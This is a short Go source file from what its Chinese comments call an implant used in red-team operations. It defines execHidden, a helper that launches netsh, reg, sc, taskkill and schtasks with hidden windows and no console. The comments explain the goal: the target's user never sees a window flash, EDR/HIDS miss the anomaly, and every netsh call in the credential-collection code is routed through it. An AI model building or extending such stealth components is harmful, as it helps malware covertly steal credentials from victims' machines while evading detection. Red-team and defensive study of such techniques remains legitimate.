//go:build windows && !light

package main

import (
	"os/exec"
	"syscall"
)

// execHidden 构造一个"绝不在目标机桌面上闪黑框"的子进程命令。
//
// 为什么必须隐藏窗口：植入端自身通常是 GUI 子系统构建，但它启动的 netsh / reg / sc /
// taskkill / schtasks 都是**控制台程序**。用裸 exec.Command 启动时，Windows 会为子进程
// 新分配一个控制台窗口 —— 目标机桌面上就会闪过一个黑框。对红队行动这就是自曝：终端
// 用户一眼看到"有个黑窗口闪了两下"，EDR/HIDS 也会把"无 UI 进程创建控制台子进程"当成
// 异常行为。所以这里同时做两件事：
//
//  1. SysProcAttr.HideWindow = true（STD_OUTPUT/STARTF_USESHOWWINDOW + SW_HIDE），
//     这是最小要求，也是单测直接断言的那一位；
//  2. SysProcAttr.CreationFlags |= CREATE_NO_WINDOW，连控制台都不分配（HideWindow
//     在极少数情况下仍会创建随后隐藏的窗口，CREATE_NO_WINDOW 才是彻底不建）。
//
// 规矩：凭据收集里所有 netsh 调用（以及后续任何 reg/taskkill/sc/schtasks 调用）都必须
// 走这个助手，不要直接 exec.Command —— 漏一处就等于留一个闪窗点。
func execHidden(name string, args ...string) *exec.Cmd {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: createNoWindowFlag,
	}
	return cmd
}
